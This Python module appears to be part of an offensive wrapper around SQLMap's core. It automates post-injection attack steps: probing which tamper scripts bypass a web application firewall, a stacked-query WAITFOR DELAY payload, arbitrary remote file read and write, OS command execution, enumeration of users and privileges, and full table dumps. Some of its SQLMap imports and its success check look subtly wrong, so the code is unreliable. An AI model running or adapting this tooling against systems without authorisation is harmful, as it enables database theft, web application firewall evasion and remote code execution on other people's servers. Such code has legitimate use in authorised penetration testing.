"""Advanced SQLMap features using direct core access."""

import logging
from typing import List, Dict, Optional, Any
from .core_bridge import SQLMapCoreBridge, Finding

logger = logging.getLogger(__name__)


class AdvancedSQLMapFeatures:
    """Use SQLMap core features directly."""

    def __init__(self, target_profile):
        self.target_profile = target_profile
        self.bridge = SQLMapCoreBridge(target_profile)

    def fingerprint_dbms(self, injection: Finding) -> Dict[str, Any]:
        """Get detailed DBMS information."""
        try:
            from lib.core.data import kb

            fingerprint = {
                'dbms': injection.dbms or 'unknown',
                'version': None,
                'os': injection.os,
                'architecture': None
            }

            if hasattr(kb, 'bannerFp'):
                fingerprint['version'] = kb.bannerFp.get('dbmsVersion')
                fingerprint['architecture'] = kb.bannerFp.get('architecture')

            return fingerprint

        except Exception as e:
            logger.error(f"DBMS fingerprinting error: {e}")
            return {
                'dbms': injection.dbms or 'unknown',
                'version': None,
                'os': injection.os,
                'architecture': None
            }

    def test_waf_bypass(self, injection: Finding, url: str) -> List[str]:
        """Test which tamper scripts work."""
        working_tampers = []

        tamper_scripts = [
            'space2comment',
            'between',
            'charencode',
            'randomcase',
            'appendnullbyte',
            'base64encode',
            'chardoubleencode',
            'equaltolike',
            'greatest',
            'ifnull2ifisnull',
            'modsecurityversioned',
            'percentage',
            'randomcomments',
            'space2hash',
            'space2mssqlblank',
            'space2mysqldash',
            'space2plus',
            'space2randomblank',
            'unionalltounion',
            'varnish'
        ]

        for tamper in tamper_scripts:
            try:
                payload = self._apply_tamper(injection.payload, tamper)
                if self.test_payload(payload, injection, url):
                    working_tampers.append(tamper)
                    logger.info(f"Tamper script '{tamper}' works")
            except Exception as e:
                logger.debug(f"Tamper script '{tamper}' failed: {e}")

        return working_tampers

    def _apply_tamper(self, payload: str, tamper_name: str) -> str:
        """Apply a tamper script to a payload."""
        try:
            from lib.core.convert import urlencode
            from importlib import import_module

            # Import tamper module from SQLMap's tamper directory
            tamper_module = import_module(f'tamper.{tamper_name}')
            if hasattr(tamper_module, 'tamper'):
                return tamper_module.tamper(payload)
            return payload

        except Exception as e:
            logger.debug(f"Failed to apply tamper {tamper_name}: {e}")
            return payload

    def test_payload(self, payload: str, injection: Finding, url: str) -> bool:
        """Test if a payload works against the target."""
        try:
            # Make request with modified payload
            modified_url = self._inject_payload(url, injection.parameter, payload)

            # Use SQLMap's request handler
            from lib.request.connect import Connect
            connect = Connect()

            response = connect.getPage(url=modified_url, method='GET')

            # Basic validation - check if response indicates success
            if response and len(response[0]) > 0:
                return True

            return False

        except Exception as e:
            logger.debug(f"Payload test failed: {e}")
            return False

    def _inject_payload(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if parameter in params:
            params[parameter] = [payload]
        else:
            params[parameter] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

    def test_stacked_queries(self, injection: Finding, url: str) -> bool:
        """Test if stacked queries are possible."""
        try:
            # Test payload with time delay
            test_payload = injection.payload + "; WAITFOR DELAY '00:00:05'; --"
            return self.test_payload(test_payload, injection, url)

        except Exception as e:
            logger.error(f"Stacked query test error: {e}")
            return False

    def read_file(self, injection: Finding, filepath: str) -> Optional[str]:
        """Read arbitrary file (if permissions allow)."""
        try:
            from lib.core.data import kb, conf

            # Set file read configuration
            conf.rFile = filepath

            # Use SQLMap's file reading
            from lib.takeover.udf import readRemoteFile

            content = readRemoteFile(filepath)
            return content

        except Exception as e:
            logger.error(f"File read error: {e}")
            return None

    def write_file(self, injection: Finding, local_file: str, remote_file: str) -> bool:
        """Write file to remote system (if permissions allow)."""
        try:
            from lib.core.data import conf

            # Set file write configuration
            conf.wFile = local_file
            conf.dFile = remote_file

            # Use SQLMap's file writing
            from lib.takeover.udf import writeRemoteFile

            writeRemoteFile(local_file, remote_file)
            return True

        except Exception as e:
            logger.error(f"File write error: {e}")
            return False

    def execute_command(self, injection: Finding, command: str) -> Optional[str]:
        """Execute OS command (if privileges allow)."""
        try:
            from lib.core.data import conf

            # Set OS command
            conf.osCmd = command

            # Use SQLMap's command execution
            from lib.takeover.abstraction import execCmd

            output = execCmd(command)
            return output

        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return None

    def get_privileges(self, injection: Finding) -> List[str]:
        """Get current database user privileges."""
        try:
            from lib.core.data import kb

            privileges = []
            if hasattr(kb, 'data') and 'privileges' in kb.data:
                privileges = kb.data['privileges']

            return privileges

        except Exception as e:
            logger.error(f"Privilege enumeration error: {e}")
            return []

    def get_users(self, injection: Finding) -> List[str]:
        """Get database users."""
        try:
            from lib.core.data import kb

            users = []
            if hasattr(kb, 'data') and 'users' in kb.data:
                users = kb.data['users']

            return users

        except Exception as e:
            logger.error(f"User enumeration error: {e}")
            return []

    def dump_table(self, injection: Finding, database: str, table: str) -> List[Dict[str, Any]]:
        """Dump entire table contents."""
        try:
            columns = self.bridge.enumerate_columns(injection, database, table)
            data = self.bridge.read_data(injection, database, table, columns)
            return data

        except Exception as e:
            logger.error(f"Table dump error: {e}")
            return []

    def search_columns(self, injection: Finding, column_name: str) -> List[Dict[str, str]]:
        """Search for columns by name across all databases."""
        try:
            from sqlmap.lib.core.data import kb

            results = []
            if hasattr(kb, 'data'):
                for db_name, db_data in kb.data.items():
                    if 'tables' in db_data:
                        for table_name, table_data in db_data['tables'].items():
                            if 'columns' in table_data:
                                for column in table_data['columns']:
                                    if column_name.lower() in column.lower():
                                        results.append({
                                            'database': db_name,
                                            'table': table_name,
                                            'column': column
                                        })

            return results

        except Exception as e:
            logger.error(f"Column search error: {e}")
            return []
